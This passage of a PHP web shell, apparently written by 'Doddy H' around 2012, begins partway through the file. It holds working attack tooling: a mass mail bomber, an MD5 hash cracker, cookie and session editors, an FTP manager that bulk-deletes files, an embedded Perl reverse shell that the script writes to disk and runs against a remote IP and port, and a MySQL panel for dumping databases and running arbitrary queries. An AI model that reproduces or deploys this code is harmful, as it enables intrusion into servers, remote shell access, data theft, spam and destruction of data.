        $need.= "X-Priority: 1\n";
        $need.= "X-MSMail-Priority:Hight\n";
        $need.= "X-Mailer:Widgets.com Server";
        echo "<br><br><br><center><h2>Result</h2><br><br>";
        for ($i = 1;$i <= $_POST['count'];$i++) {
            if ($_POST['listamails'] != "None") {
                $open = fopen($_POST['listamails'], "r");
                while (!feof($open)) {
                    $word = fgets($open, 255);
                    $word = chop($word);
                    if (@mail($word, $_POST['asunto'], $_POST['mensaje'], $need)) {
                        echo "[+] Message <b>$i</b> to <b>" . $word . "</b> Send<br>";
                        flush();
                    } else {
                        echo "[+] Message <b>$i</b> to <b>" . $word . "</b> Not Send<br>";
                    }
                }
            } else {
                if (@mail($_POST['idiot'], $_POST['asunto'], $_POST['mensaje'], $need)) {
                    echo "[+] Message <b>$i</b> to <b>" . $_POST['idiot'] . "</b> Send<br>";
                    flush();
                } else {
                    echo "[+] Message <b>$i</b> to <b>" . $_POST['idiot'] . "</b> Not Send<br>";
                }
            }
        }
        echo "</center>";
    }
    if (isset($_GET['md5crack'])) {
        echo "
<center>
<h2>MD5 Cracker</h2><br><br>
<form action='' method=POST>
<table border=1>
<td><b>Hash : </b></td><td><input type=text name=md5 size=50 value=098f6bcd4621d373cade4e832627b4f6></td><tr>
<td><b>Salt : </b></td><td><input type=text name=salto size=50></td><tr>
<td><b>Wordlist : </b></td><td><input type=text name=listmd5 size=50 value='c:/aca.txt'></td>
</table><br><br>
<input type=submit value=Crack>
</form>
</center>
";
    }
    if (isset($_POST['md5'])) {
        $open = fopen($_POST['listmd5'], "r");
        echo "<br><br><fieldset><center>";
        echo "<br>[+] Starting the search<br><br>";
        while (!feof($open)) {
            $word = fgets($open, 255);
            $linea = chop($word);
            if (!empty($_POST['salto'])) {
                $test = md5($linea . $_POST['salto']);
            } else {
                $test = md5($linea);
            }
            if ($test == $_POST['md5']) {
                echo "<br>[+] Hash Cracked : " . $_POST['md5'] . ":" . $linea . "<br><br>";
                creditos();
            } else {
                echo "[+] : " . $_POST['md5'] . " != " . $linea . "<br>";
            }
        }
        echo "<br>[+] Finished<br>";
        echo "</center></fieldset>";
    }
    if (isset($_GET['cookiemanager'])) {
        echo "<h2>Cookies</h2><br><br>";
        echo "[+] <b>Cookies Found</b> : " . count($_COOKIE) . "<br><br>";
        echo "
<br><BR><form action='' method=POST>
<b>New cookie :</b> <input type=text name=cookienew><BR>
<b>Value :</b> <input type=text name=valor><BR><br>
<input type=submit value=Create><BR><br><br>
</form><br>";
        echo "<table>";
        echo "<td class=main><b>Name</b></td><td class=main><b>Value</b></td><tr>";
        if (count($_COOKIE) != 0) {
            foreach($_COOKIE as $nombre => $valor) {
                echo "<td class=main>" . $nombre . "</td><td class=main>" . $valor . "</td><tr>";
            }
            echo "</table>";
        }
        echo "<br><br>";
    }
    if (isset($_GET['sessionmanager'])) {
        @session_start();
        echo "<h2>Session</h2><br><br>";
        echo "[+] <b>Sessions Found</b> : " . count($_SESSION) . "<br><br>";
        echo "
<br><BR><form action='' method=POST>
<b>New session :</b> <input type=text name=sessionew><BR>
<b>Value :</b> <input type=text name=valor><BR><br>
<input type=submit value=Create><BR><br><br>
</form><br>";
        if (count($_SESSION) != 0) {
            echo "<table>";
            echo "<td class=main><b>Name</b></td><td class=main><b>Value</b></td><tr>";
            foreach($_SESSION as $nombre => $valor) {
                echo "<td class=main>" . $nombre . "</td><td class=main>" . $valor . "</td><tr>";
            }
            echo "</table>";
        }
    }
    if (isset($_GET['ftp'])) {
        echo "<center><h2>FTP Manager</h2><br>";
        echo "
<table border=1>
<form action='' method=GET>
<td><b>Server : </b></td><td><input type=text name=serverftp value=127.0.0.1></td><tr>
<td><b>User : </b></td><td><input type=text name=user value=doddy></td><tr>
<td><b>Pass : </b></td><td><input type=text name=pass value=123></td><tr>
</table><br>
<input type=hidden name=diar value=/>
<input type=submit value=Connect><br><br>
</center></form>
";
    }
    if (isset($_GET['serverftp'])) {
        if ($enter = @ftp_connect($_GET['serverftp'])) {
            if ($dentro = @ftp_login($enter, $_GET['user'], $_GET['pass'])) {
                echo "<br><b>[+] Connected to server</b><br>";
            } else {
                echo "<br><b>[-] Error in the login</b><br><br>";
                creditos();
            }
            echo "<b>[+] ONline</b><br><br><br>";
            echo "
<form action='' method=GET>
Directory : <input type=text name=diar value=";
            if (empty($_GET['diar'])) {
                echo ftp_pwd($enter);
            } else {
                echo $_GET['diar'];
            }
            echo ">
<input type=hidden name=serverftp value=" . $_GET['serverftp'] . ">
<input type=hidden name=user value=" . $_GET['user'] . ">
<input type=hidden name=pass value=" . $_GET['pass'] . ">
<input type=submit value=Load>
</form>
<br><br>
<form action='' method=GET>
New directory : <input type=text name=newdirftp><input type=submit value=Load>
<input type=hidden name=serverftp value=" . $_GET['serverftp'] . ">
<input type=hidden name=user value=" . $_GET['user'] . ">
<input type=hidden name=pass value=" . $_GET['pass'] . ">
<input type=hidden name=diar value=" . $_GET['diar'] . ">
</form>
<br><br>
<br><br>";
            if (isset($_GET['diar'])) {
                $enter = @ftp_connect($_GET['serverftp']);
                $dentro = @ftp_login($enter, $_GET['user'], $_GET['pass']);
                if (empty($_GET['diar'])) {
                    if (!$lista = ftp_nlist($enter . ".")) {
                        echo "<script>alert('Error loading directory');</script>";
                        creditos();
                    }
                } else {
                    if (!$lista = ftp_nlist($enter, $_GET['diar'])) {
                        echo "<script>alert('Bad Login');</script>";
                        creditos();
                    }
                }
            }
            echo "<form action='' method=POST>";
            echo "<input type=hidden name=serverftp value=" . $_GET['serverftp'] . ">
<input type=hidden name=user value=" . $_GET['user'] . ">
<input type=hidden name=pass value=" . $_GET['pass'] . ">";
            echo "<table>";
            echo "<td class=main>Name</td><td class=main>Type</td><td class=main>Action</td><tr>";
            foreach($lista as $ver) {
                if (ftp_size($enter, ftp_pwd($enter) . $ver) == - 1) {
                    echo "<td class=main><a href=?serverftp=" . $_GET['serverftp'] . "&user=" . $_GET['user'] . "&pass=" . $_GET['pass'] . "&diar=" . $ver . ">$ver</a></td>";
                    echo "<td class=main>Directory</td>";
                    echo "<td><input type=checkbox name=vax[] value='" . $ver . "'></td>";
                    echo "<tr>";
                } else {
                    echo "<td class=main>" . $ver . "</td>";
                    echo "<td class=main>File</td>";
                    echo "<td><input type=checkbox name=vax[] value='" . $ver . "'></td>";
                    echo "<tr>";
                }
            }
            if (isset($_POST['furia'])) {
                $files = $_POST['vax'];
                $enter = ftp_connect($_POST['serverftp']);
                $dentro = ftp_login($enter, $_POST['user'], $_POST['pass']);
                foreach($files as $file) {
                    if (ftp_delete($enter, ftp_pwd($enter) . "/" . $file)) {
                    } else {
                        ftp_rmdir($enter, ftp_pwd($enter) . "/" . $file);
                    }
                }
                echo "<script>alert('Files Deleted');</script>";
            }
            echo "</table>";
            echo "<br><br>
Options : 
<select name=op>
<option>Delete</option>
</select>&nbsp;&nbsp;<input type=submit name=furia value=Ok></form>";
        } else {
            echo "<b>[-] Error in the server</b><br><br>";
        }
    }
    if (isset($_GET['newdirftp'])) {
        $enter = ftp_connect($_GET['serverftp']);
        $dentro = ftp_login($enter, $_GET['user'], $_GET['pass']);
        if (ftp_mkdir($enter, $_GET['diar'] . $_GET['newdirftp'])) {
            echo "<script>alert('Directory created');</script>";
            echo '<meta http-equiv="refresh" content="0;URL=?serverftp=' . $_GET['serverftp'] . "&user=" . $_GET['user'] . "&pass=" . $_GET['pass'] . "&diar=" . $_GET['diar'] . '>';
        } else {
            echo "<script>alert('Error');</script>";
        }
    }
    if (isset($_GET['backshell'])) {
        echo "
<center>
<h2>BackShell</h2><br><br>
<table border=1>
<form action='' method=GET>
<td><b>IP : </b></td><td><input type=text name=ipar value=" . $_SERVER['REMOTE_ADDR'] . "></td><tr>
<td><b>Port : </b></td><td><input type=text name=portar value=666></td><tr>
<td><b>Type : </b></td><td><select name=tipo>
<option>Perl</option>
</select></td><tr></table>
<br><br>
<input type=submit value=Conectar>
</center>
</form>
";
    }
    if (isset($_GET['ipar'])) {
        if ($_GET['tipo'] == "Perl") {
            $code = ' 
#!usr/bin/perl
#Reverse Shell 0.2
#Coded By Doddy H
#Command : nc -lvvp 666

use IO::Socket;

print "\n== -- Reverse Shell 0.2 - Doddy H 2012 -- ==\n\n";

unless ( @ARGV == 2 ) {
    print "[Sintax] : $0 <host> <port>\n\n";
    exit(1);
}
else {
    print "[+] Starting the connection\n";
    print "[+] Enter in the system\n";
    print "[+] Enjoy !!!\n\n";
    conectar( $ARGV[0], $ARGV[1] );
    tipo();
}

sub conectar {
    socket( REVERSE, PF_INET, SOCK_STREAM, getprotobyname("tcp") );
    connect( REVERSE, sockaddr_in( $_[1], inet_aton( $_[0] ) ) );
    open( STDIN,  ">&REVERSE" );
    open( STDOUT, ">&REVERSE" );
    open( STDERR, ">&REVERSE" );
}

sub tipo {
    print "\n[+] Reverse Shell Starting...\n\n";
    if ( $^O =~ /Win32/ig ) {
        infowin();
        system("cmd.exe");
    }
    else {
        infolinux();
        system("export TERM=xterm;exec sh -i");
    }
}

sub infowin {
    print "[+] Domain Name : " . Win32::DomainName() . "\n";
    print "[+] OS Version : " . Win32::GetOSName() . "\n";
    print "[+] Username : " . Win32::LoginName() . "\n\n\n";
}

sub infolinux {
    print "[+] System information\n\n";
    system("uname -a");
    print "\n\n";
}

#The End ?
';
            echo "<center><h2>OutPut</h2></center>";
            $de = $_SERVER["HTTP_USER_AGENT"];
            if (eregi("Win", $de)) {
                if ($test = fopen("back.pl", "w")) {
                    echo "<br><br><b><center>[+] Shell Created</b><br>";
                } else {
                    echo "<br><br><b>[-] Error creating the shell</b><br>";
                }
            } else {
                if ($test = fopen("/tmp/back.pl", "w")) {
                    echo "<br><br><b>[+] Shell Created</b><br>";
                } else {
                    echo "<br><br><b>[-] Error creating the shell</b><br>";
                }
            }
            if (fwrite($test, $code)) {
                if (eregi("Win", $de)) {
                    if (chmod("back.pl", 0777)) {
                        echo "<b>[+] Perms Changed<br></b>";
                    } else {
                        echo "<b>[-] Not priviligies to changed permissions</b><br>";
                    }
                    echo "<b>[+] Loading Shell</b><br><br><br>";
                    echo "<br><BR>";
                    echo "<fieldset>";
                    if (!system("perl back.pl " . $_GET['ipar'] . " " . $_GET['portar'])) {
                        echo "<script>alert('Error Loading Shell');</script>";
                    }
                    echo "</fieldset>";
                } else {
                    if (chmod("/tmp/back.pl", 0777)) {
                        echo "<b>[+] Perms Changed<br></b>";
                    } else {
                        echo "<b>[-] Not priviligies to changed permissions</b><br>";
                    }
                    echo "<b>[+] Loading Shell</b><br><br><br>";
                    echo "<br><BR>";
                    echo "<fieldset>";
                    if (!system("cd /tmp;perl back.pl " . $_GET['ipar'] . " " . $_GET['portar'])) {
                        echo "<script>alert('Error Loading Shell');</script>";
                    }
                    echo "</center></fieldset>";
                }
            } else {
                echo "<br><b>[-] Error writing in the shell<br><br></b>";
            }
        }
        echo "<br><br>";
    }
    if (isset($_GET['sql'])) {
        echo "
<center><h2>SQL Manager</h2></center><br>
<center>
<table border=1>
<form action='' method=GET>
<td><b>Server : </b></td><td><input type=text name=host value=localhost></td><tr>
<td><b>User : </b></td><td><input type=text name=usuario value=root></td><tr>
<td><b>Pass : </b></td><td><input type=text name=password value=123></td><tr>
</table>
<br><input type=submit name=entersql value=Connect>
</form></center>
";
    }
    if (isset($_GET['entersql'])) {
        if ($mysql = @mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password'])) {
            if ($databases = @mysql_list_dbs($mysql)) {
                echo "<br><br><center><h2>Databases Found</h2><br>";
                echo "<table>";
                while ($dat = @mysql_fetch_row($databases)) {
                    foreach($dat as $indice => $valor) {
                        echo "<td class=main>$valor</td><td class=main><a href=?datear=$valor&host=" . $_GET['host'] . "&usuario=" . $_GET['usuario'] . "&password=" . $_GET['password'] . "&enterdb=" . $valor . ">Enter</a></td><td class=main><a href=?datear=$valor&host=" . $_GET['host'] . "&usuario=" . $_GET['usuario'] . "&password=" . $_GET['password'] . "&bajardb=" . $valor . ">Download</a></td><tr>";
                    }
                }
                echo "</table>";
            } else {
                echo "<script>alert('Error loading databases');</script>";
                creditos();
            }
        } else {
            echo "<script>alert('Error');</script>";
            creditos();
        }
    }
    if (isset($_GET['enterdb'])) {
        $mysql = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']);
        mysql_select_db($_GET['enterdb']);
        echo "<center>";
        $tablas = mysql_query("show tables from " . $_GET['enterdb']) or die("error");
        echo "<br><h2>Tables Found</h2><br><br><table>";
        while ($tabla = mysql_fetch_row($tablas)) {
            foreach($tabla as $indice => $valor) {
                echo "<td class=main>$valor</td><td class=main><a href=?datear=$valor&host=" . $_GET['host'] . "&usuario=" . $_GET['usuario'] . "&password=" . $_GET['password'] . "&entertable=" . $valor . "&condb=" . $_GET['enterdb'] . ">Enter</a></td></td><td class=main><a href=?datear=$valor&host=" . $_GET['host'] . "&usuario=" . $_GET['usuario'] . "&password=" . $_GET['password'] . "&bajartabla=" . $valor . "&condb=" . $_GET['enterdb'] . ">Download</a><tr>";
            }
        }
        echo "</table>";
    }
    if (isset($_GET['entertable'])) {
        $mysql = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']);
        mysql_select_db($_GET['condb']);
        echo "<br><center><h2>SQL Manager</h2>
<br><br>
<form action='' method=POST>
<b>Consulta SQL : </b><input type=text name=sentencia size=70 value='select * from " . $_GET['datear'] . "'>
<br><br><br>    
<input type=hidden name=host value=" . $_GET['host'] . ">
<input type=hidden name=usuario value=" . $_GET['usuario'] . ">
<input type=hidden name=password value=" . $_GET['password'] . ">
<input type=hidden name=condb value=" . $_GET['database'] . ">
<input type=hidden name=entertable value=" . $_GET['tabla'] . ">
<input type=submit name=mostrar value=eNViar>
</form>
<br><br><br><br><br>";
        $conexion = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die("<h1>Error</h1>");
        mysql_select_db($_GET['condb']);
        if (isset($_POST['mostrar'])) {
            if (!empty($_POST['sentencia'])) {
                $resultado = mysql_query($_POST['sentencia']);
            } else {
                $resultado = mysql_query("SELECT * FROM " . $_GET['entertable']);
            }
            $numer = 0;
            echo "<table>";
            for ($i = 0;$i < mysql_num_fields($resultado);$i++) {
                echo "<th class=main>" . mysql_field_name($resultado, $i) . "</th>";
                $numer++;
            }
            while ($dat = mysql_fetch_row($resultado)) {
                echo "<tr>";
                foreach($dat as $val) {
                    echo "<td class=main>" . $val . "</td>";
                }
            }
            echo "</tr></table>";
        }
    }
    creditos();
} else {
    echo "
<form action='' method=POST>
Username : <input type=text name=user><br>
Password : <input type=text name=pass><br><br>
<input type=submit value=Login>
</form>
";
}

// The End ?

?>